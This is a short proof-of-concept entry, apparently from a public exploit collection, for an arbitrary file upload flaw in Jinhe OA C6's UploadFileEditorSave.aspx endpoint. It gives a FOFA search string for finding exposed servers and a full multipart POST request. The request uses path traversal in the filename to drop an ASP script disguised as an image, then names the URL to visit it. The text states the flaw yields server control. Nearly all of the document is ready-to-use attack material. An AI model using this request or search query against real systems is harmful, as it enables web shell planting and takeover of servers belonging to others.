## 金和OA_uploadfileeditorsave接口存在任意文件上传漏洞

金和-c6 uploadfileeditorsave 任意文件上传，攻击者可通过此漏洞获取服务器权限

## fofa
```
app="金和网络-金和OA"
```

## poc
```
POST /C6/Control/UploadFileEditorSave.aspx?filename=\....\....\C6\qps4cckjuz.asp HTTP/1.1
Host: your_ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Connection: close
Content-Length: 191
Content-Type: multipart/form-data; boundary=----9fh1lo9qobtszaiahg6v
Accept-Encoding: gzip, deflate

------9fh1lo9qobtszaiahg6v
Content-Disposition: form-data; name="file"; filename="qps4cckjuz.jpg"
Content-Type: image/png

<% response.write(111*111)
%>

------9fh1lo9qobtszaiahg6v--
```
![image](https://github.com/wy876/POC/assets/139549762/5bb65609-982b-4ebb-9242-3da526eee36b)

访问上传文件路径：
http://your_ip/C6/qps4cckjuz.asp
